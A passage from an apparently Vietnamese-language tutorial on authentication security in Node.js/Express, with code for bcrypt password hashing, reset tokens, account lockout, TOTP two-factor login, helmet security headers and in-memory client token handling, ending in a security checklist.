const SALT_ROUNDS = 12; // Tăng lên nếu hardware mạnh hơn

const hashPassword = async (password) => {
  return await bcrypt.hash(password, SALT_ROUNDS);
};

const verifyPassword = async (password, hash) => {
  return await bcrypt.compare(password, hash);
};

// 2. Validate password strength
const validatePassword = (password) => {
  const result = zxcvbn(password);

  const errors = [];

  if (password.length < 8) {
    errors.push("Password must be at least 8 characters");
  }

  if (password.length > 128) {
    errors.push("Password must not exceed 128 characters");
  }

  if (result.score < 3) {
    errors.push("Password is too weak");
    if (result.feedback.warning) {
      errors.push(result.feedback.warning);
    }
    errors.push(...result.feedback.suggestions);
  }

  // Check common patterns
  if (/^[a-zA-Z]+$/.test(password)) {
    errors.push("Password must contain numbers or special characters");
  }

  if (/^[0-9]+$/.test(password)) {
    errors.push("Password must contain letters");
  }

  return {
    isValid: errors.length === 0,
    errors,
    score: result.score,
    crackTime: result.crack_times_display.offline_slow_hashing_1e4_per_second,
  };
};

// 3. Password change với verification
app.post("/api/auth/change-password", verifyAccessToken, async (req, res) => {
  try {
    const { currentPassword, newPassword } = req.body;

    // Validate new password
    const validation = validatePassword(newPassword);
    if (!validation.isValid) {
      return res.status(400).json({ errors: validation.errors });
    }

    // Get user with password
    const user = await User.findById(req.user.id).select("+password");

    // Verify current password
    const isValid = await verifyPassword(currentPassword, user.password);
    if (!isValid) {
      return res.status(401).json({ error: "Current password is incorrect" });
    }

    // Check new password is different
    const isSame = await verifyPassword(newPassword, user.password);
    if (isSame) {
      return res.status(400).json({ error: "New password must be different" });
    }

    // Hash and save new password
    user.password = await hashPassword(newPassword);
    user.passwordChangedAt = new Date();
    user.tokenVersion += 1; // Invalidate all tokens
    await user.save();

    // Revoke all refresh tokens
    await RefreshToken.deleteMany({ userId: user.id });

    res.json({ message: "Password changed. Please login again." });
  } catch (error) {
    console.error("Change password error:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});

// 4. Password reset flow
app.post("/api/auth/forgot-password", authLimiter, async (req, res) => {
  try {
    const { email } = req.body;

    // Always return success (prevent email enumeration)
    res.json({ message: "If email exists, reset link will be sent" });

    const user = await User.findOne({ email });
    if (!user) return;

    // Generate secure reset token
    const resetToken = crypto.randomBytes(32).toString("hex");
    const resetTokenHash = crypto.createHash("sha256").update(resetToken).digest("hex");

    // Save hashed token
    user.passwordResetToken = resetTokenHash;
    user.passwordResetExpires = new Date(Date.now() + 60 * 60 * 1000); // 1 hour
    await user.save();

    // Send email with reset link
    const resetUrl = `${process.env.FRONTEND_URL}/reset-password?token=${resetToken}`;
    await sendEmail({
      to: user.email,
      subject: "Password Reset",
      html: `Click <a href="${resetUrl}">here</a> to reset your password. Link expires in 1 hour.`,
    });
  } catch (error) {
    console.error("Forgot password error:", error);
  }
});

app.post("/api/auth/reset-password", authLimiter, async (req, res) => {
  try {
    const { token, newPassword } = req.body;

    // Validate password
    const validation = validatePassword(newPassword);
    if (!validation.isValid) {
      return res.status(400).json({ errors: validation.errors });
    }

    // Hash token to compare
    const tokenHash = crypto.createHash("sha256").update(token).digest("hex");

    // Find user with valid token
    const user = await User.findOne({
      passwordResetToken: tokenHash,
      passwordResetExpires: { $gt: new Date() },
    });

    if (!user) {
      return res.status(400).json({ error: "Invalid or expired token" });
    }

    // Update password
    user.password = await hashPassword(newPassword);
    user.passwordResetToken = undefined;
    user.passwordResetExpires = undefined;
    user.passwordChangedAt = new Date();
    user.tokenVersion += 1;
    await user.save();

    // Revoke all sessions
    await RefreshToken.deleteMany({ userId: user.id });

    res.json({ message: "Password reset successful. Please login." });
  } catch (error) {
    console.error("Reset password error:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});
```

### Account Lockout Protection

```javascript
// ===== BRUTE FORCE PROTECTION =====

const MAX_LOGIN_ATTEMPTS = 5;
const LOCK_TIME = 15 * 60 * 1000; // 15 minutes
const ATTEMPT_WINDOW = 60 * 60 * 1000; // 1 hour

// Schema
const userSchema = new Schema({
  // ... other fields
  loginAttempts: { type: Number, default: 0 },
  lockUntil: { type: Date },
  lastFailedLogin: { type: Date },
});

// Virtual for checking if locked
userSchema.virtual("isLocked").get(function () {
  return this.lockUntil && this.lockUntil > new Date();
});

// Method to increment login attempts
userSchema.methods.incLoginAttempts = async function () {
  // Reset if lock has expired
  if (this.lockUntil && this.lockUntil < new Date()) {
    return this.updateOne({
      $set: { loginAttempts: 1, lastFailedLogin: new Date() },
      $unset: { lockUntil: 1 },
    });
  }

  // Reset if last attempt was too long ago
  if (this.lastFailedLogin && new Date() - this.lastFailedLogin > ATTEMPT_WINDOW) {
    return this.updateOne({
      $set: { loginAttempts: 1, lastFailedLogin: new Date() },
    });
  }

  const updates = {
    $inc: { loginAttempts: 1 },
    $set: { lastFailedLogin: new Date() },
  };

  // Lock account if max attempts reached
  if (this.loginAttempts + 1 >= MAX_LOGIN_ATTEMPTS) {
    updates.$set.lockUntil = new Date(Date.now() + LOCK_TIME);
  }

  return this.updateOne(updates);
};

// Login với protection
app.post("/api/auth/login", authLimiter, async (req, res) => {
  const { email, password } = req.body;

  const user = await User.findOne({ email }).select("+password");

  if (!user) {
    return res.status(401).json({ error: "Invalid credentials" });
  }

  // Check if account is locked
  if (user.isLocked) {
    const remainingTime = Math.ceil((user.lockUntil - new Date()) / 1000 / 60);
    return res.status(423).json({
      error: "Account temporarily locked",
      message: `Try again in ${remainingTime} minutes`,
      lockedUntil: user.lockUntil,
    });
  }

  // Verify password
  const isValid = await verifyPassword(password, user.password);

  if (!isValid) {
    await user.incLoginAttempts();

    const attemptsLeft = MAX_LOGIN_ATTEMPTS - user.loginAttempts - 1;

    return res.status(401).json({
      error: "Invalid credentials",
      attemptsLeft: Math.max(0, attemptsLeft),
    });
  }

  // Reset attempts on successful login
  if (user.loginAttempts > 0) {
    await user.updateOne({
      $set: { loginAttempts: 0 },
      $unset: { lockUntil: 1, lastFailedLogin: 1 },
    });
  }

  // Continue with token generation...
});
```

### Two-Factor Authentication (2FA)

```javascript
// ===== 2FA VỚI TOTP =====
const speakeasy = require("speakeasy");
const QRCode = require("qrcode");

// 1. Enable 2FA - Generate secret
app.post("/api/auth/2fa/setup", verifyAccessToken, async (req, res) => {
  try {
    const user = await User.findById(req.user.id);

    if (user.twoFactorEnabled) {
      return res.status(400).json({ error: "2FA already enabled" });
    }

    // Generate secret
    const secret = speakeasy.generateSecret({
      name: `MyApp:${user.email}`,
      issuer: "MyApp",
    });

    // Lưu secret tạm thời (chưa enable)
    user.twoFactorTempSecret = secret.base32;
    await user.save();

    // Generate QR code
    const qrCodeUrl = await QRCode.toDataURL(secret.otpauth_url);

    res.json({
      secret: secret.base32,
      qrCode: qrCodeUrl,
    });
  } catch (error) {
    console.error("2FA setup error:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});

// 2. Verify và enable 2FA
app.post("/api/auth/2fa/verify", verifyAccessToken, async (req, res) => {
  try {
    const { code } = req.body;
    const user = await User.findById(req.user.id);

    if (!user.twoFactorTempSecret) {
      return res.status(400).json({ error: "Please setup 2FA first" });
    }

    // Verify code
    const verified = speakeasy.totp.verify({
      secret: user.twoFactorTempSecret,
      encoding: "base32",
      token: code,
      window: 1, // Allow 1 step before/after
    });

    if (!verified) {
      return res.status(400).json({ error: "Invalid code" });
    }

    // Enable 2FA
    user.twoFactorSecret = user.twoFactorTempSecret;
    user.twoFactorEnabled = true;
    user.twoFactorTempSecret = undefined;

    // Generate backup codes
    const backupCodes = [];
    for (let i = 0; i < 10; i++) {
      const code = crypto.randomBytes(4).toString("hex");
      backupCodes.push(code);
    }

    // Hash backup codes
    user.twoFactorBackupCodes = await Promise.all(backupCodes.map((code) => bcrypt.hash(code, 10)));

    await user.save();

    res.json({
      message: "2FA enabled successfully",
      backupCodes, // Show once, user must save
    });
  } catch (error) {
    console.error("2FA verify error:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});

// 3. Login với 2FA
app.post("/api/auth/login", authLimiter, async (req, res) => {
  const { email, password, twoFactorCode } = req.body;

  const user = await User.findOne({ email }).select("+password +twoFactorSecret");

  // ... verify password ...

  // Check if 2FA is enabled
  if (user.twoFactorEnabled) {
    if (!twoFactorCode) {
      return res.status(200).json({
        requiresTwoFactor: true,
        message: "Please provide 2FA code",
      });
    }

    // Verify TOTP code
    let verified = speakeasy.totp.verify({
      secret: user.twoFactorSecret,
      encoding: "base32",
      token: twoFactorCode,
      window: 1,
    });

    // If not verified, check backup codes
    if (!verified) {
      for (let i = 0; i < user.twoFactorBackupCodes.length; i++) {
        const isBackupCode = await bcrypt.compare(twoFactorCode, user.twoFactorBackupCodes[i]);

        if (isBackupCode) {
          verified = true;
          // Remove used backup code
          user.twoFactorBackupCodes.splice(i, 1);
          await user.save();
          break;
        }
      }
    }

    if (!verified) {
      return res.status(401).json({ error: "Invalid 2FA code" });
    }
  }

  // Continue with token generation...
});

// 4. Disable 2FA
app.post("/api/auth/2fa/disable", verifyAccessToken, async (req, res) => {
  try {
    const { password, code } = req.body;

    const user = await User.findById(req.user.id).select("+password +twoFactorSecret");

    // Verify password
    const isValid = await verifyPassword(password, user.password);
    if (!isValid) {
      return res.status(401).json({ error: "Invalid password" });
    }

    // Verify 2FA code
    const verified = speakeasy.totp.verify({
      secret: user.twoFactorSecret,
      encoding: "base32",
      token: code,
      window: 1,
    });

    if (!verified) {
      return res.status(401).json({ error: "Invalid 2FA code" });
    }

    // Disable 2FA
    user.twoFactorEnabled = false;
    user.twoFactorSecret = undefined;
    user.twoFactorBackupCodes = undefined;
    await user.save();

    res.json({ message: "2FA disabled" });
  } catch (error) {
    console.error("2FA disable error:", error);
    res.status(500).json({ error: "Internal server error" });
  }
});
```

### Security Headers và HTTPS

```javascript
// ===== SECURITY HEADERS =====
const helmet = require("helmet");

app.use(
  helmet({
    // Content Security Policy
    contentSecurityPolicy: {
      directives: {
        defaultSrc: ["'self'"],
        scriptSrc: ["'self'"],
        styleSrc: ["'self'", "'unsafe-inline'"],
        imgSrc: ["'self'", "data:", "https:"],
        connectSrc: ["'self'", "https://api.example.com"],
        fontSrc: ["'self'", "https://fonts.gstatic.com"],
        objectSrc: ["'none'"],
        upgradeInsecureRequests: [],
      },
    },

    // Strict Transport Security
    hsts: {
      maxAge: 31536000, // 1 year
      includeSubDomains: true,
      preload: true,
    },

    // Prevent clickjacking
    frameguard: { action: "deny" },

    // Prevent MIME sniffing
    noSniff: true,

    // XSS Protection
    xssFilter: true,

    // Referrer Policy
    referrerPolicy: { policy: "strict-origin-when-cross-origin" },
  })
);

// Force HTTPS
app.use((req, res, next) => {
  if (process.env.NODE_ENV === "production" && !req.secure) {
    return res.redirect(301, `https://${req.headers.host}${req.url}`);
  }
  next();
});

// Additional security headers
app.use((req, res, next) => {
  // Prevent caching of sensitive data
  res.set("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate");
  res.set("Pragma", "no-cache");
  res.set("Expires", "0");

  // Permissions Policy
  res.set("Permissions-Policy", "geolocation=(), microphone=(), camera=(), payment=()");

  next();
});
```

### Client-Side Security

```javascript
// ===== CLIENT-SIDE BEST PRACTICES =====

class SecureAuthClient {
  constructor() {
    this.accessToken = null;
    this.tokenExpiresAt = null;
    this.refreshPromise = null;
  }

  // Lưu token trong memory (không localStorage)
  setTokens(accessToken, expiresIn) {
    this.accessToken = accessToken;
    this.tokenExpiresAt = Date.now() + expiresIn * 1000 - 60000; // 1 min buffer
  }

  // Check token sắp hết hạn
  isTokenExpiringSoon() {
    return !this.accessToken || Date.now() >= this.tokenExpiresAt;
  }

  // Auto refresh trước khi hết hạn
  async getValidToken() {
    if (this.isTokenExpiringSoon()) {
      await this.refresh();
    }
    return this.accessToken;
  }

  // Refresh với deduplication
  async refresh() {
    if (this.refreshPromise) {
      return this.refreshPromise;
    }

    this.refreshPromise = fetch("/api/auth/refresh", {
      method: "POST",
      credentials: "include", // Gửi httpOnly cookie
    })
      .then(async (res) => {
        if (!res.ok) {
          this.logout();
          throw new Error("Session expired");
        }
        const data = await res.json();
        this.setTokens(data.accessToken, 900); // 15 min
        return data.accessToken;
      })
      .finally(() => {
        this.refreshPromise = null;
      });

    return this.refreshPromise;
  }

  // Fetch với auto-refresh
  async secureFetch(url, options = {}) {
    const token = await this.getValidToken();

    const response = await fetch(url, {
      ...options,
      headers: {
        ...options.headers,
        Authorization: `Bearer ${token}`,
        "Content-Type": "application/json",
      },
      credentials: "include",
    });

    // Handle 401
    if (response.status === 401) {
      const data = await response.json();

      if (data.code === "TOKEN_EXPIRED") {
        // Retry với token mới
        await this.refresh();
        return this.secureFetch(url, options);
      }

      // Token invalid → logout
      this.logout();
      throw new Error("Authentication failed");
    }

    return response;
  }

  // Logout và clear
  async logout() {
    try {
      await fetch("/api/auth/logout", {
        method: "POST",
        credentials: "include",
      });
    } catch (e) {
      // Ignore errors
    }

    this.accessToken = null;
    this.tokenExpiresAt = null;

    // Redirect to login
    window.location.href = "/login";
  }

  // Clear on tab close (optional extra security)
  setupTabCloseHandler() {
    window.addEventListener("beforeunload", () => {
      // Token trong memory sẽ tự mất
      // Có thể gọi logout nếu muốn invalidate refresh token
    });
  }

  // Detect tab visibility để refresh
  setupVisibilityHandler() {
    document.addEventListener("visibilitychange", async () => {
      if (document.visibilityState === "visible") {
        // Tab active lại → check và refresh token nếu cần
        if (this.isTokenExpiringSoon()) {
          await this.refresh();
        }
      }
    });
  }
}

// Usage
const auth = new SecureAuthClient();
auth.setupVisibilityHandler();

// Login
async function login(email, password, twoFactorCode) {
  const response = await fetch("/api/auth/login", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    credentials: "include",
    body: JSON.stringify({ email, password, twoFactorCode }),
  });

  const data = await response.json();

  if (data.requiresTwoFactor) {
    // Show 2FA input
    return { requiresTwoFactor: true };
  }

  if (response.ok) {
    auth.setTokens(data.accessToken, 900);
    return { success: true, user: data.user };
  }

  return { error: data.error };
}

// API calls
async function getProfile() {
  const response = await auth.secureFetch("/api/profile");
  return response.json();
}
```

---

## 12. Security Checklist hoàn chỉnh

### Server-Side Checklist

```
✅ TOKEN SECURITY
├── [ ] Access token ngắn hạn (15-30 phút)
├── [ ] Refresh token dài hạn trong httpOnly cookie
├── [ ] Token rotation khi refresh
├── [ ] Fingerprint binding (IP + User-Agent)
├── [ ] Token version để revoke all
├── [ ] Lưu refresh token hash trong database
└── [ ] Detect token reuse → revoke all sessions

✅ PASSWORD SECURITY
├── [ ] Bcrypt với cost factor >= 12
├── [ ] Password strength validation
├── [ ] Không giới hạn password length quá thấp
├── [ ] Secure password reset flow
├── [ ] Hash reset tokens
└── [ ] Expire reset tokens (1 hour max)

✅ BRUTE FORCE PROTECTION
├── [ ] Rate limiting trên auth endpoints
├── [ ] Account lockout sau N attempts
├── [ ] Progressive delays
├── [ ] CAPTCHA sau nhiều failures
└── [ ] Log và alert suspicious activity

✅ 2FA
├── [ ] TOTP với speakeasy/otplib
├── [ ] Backup codes (hashed)
├── [ ] Require 2FA cho sensitive actions
└── [ ] Allow recovery options

✅ HEADERS & HTTPS
├── [ ] Helmet.js với CSP
├── [ ] HSTS enabled
├── [ ] Force HTTPS redirect
├── [ ] Secure cookie flags
└── [ ] SameSite cookie attribute

✅ INPUT VALIDATION
├── [ ] Validate tất cả input
├── [ ] Sanitize output
├── [ ] Parameterized queries
└── [ ] Content-Type validation
```

### Client-Side Checklist

```
✅ TOKEN STORAGE
├── [ ] Access token trong memory ONLY
├── [ ] KHÔNG lưu tokens trong localStorage
├── [ ] Refresh token trong httpOnly cookie
└── [ ] Clear tokens khi logout

✅ REQUEST SECURITY
├── [ ] Gửi token qua Authorization header
├── [ ] Include credentials cho cookies
├── [ ] Handle 401 responses properly
└── [ ] Auto-refresh trước khi hết hạn

✅ XSS PREVENTION
├── [ ] Sanitize user input
├── [ ] Use textContent thay vì innerHTML
├── [ ] CSP headers
└── [ ] Escape output

✅ GENERAL
├── [ ] HTTPS only
├── [ ] Validate server responses
├── [ ] Handle errors gracefully
└── [ ] Secure error messages (không leak info)
```
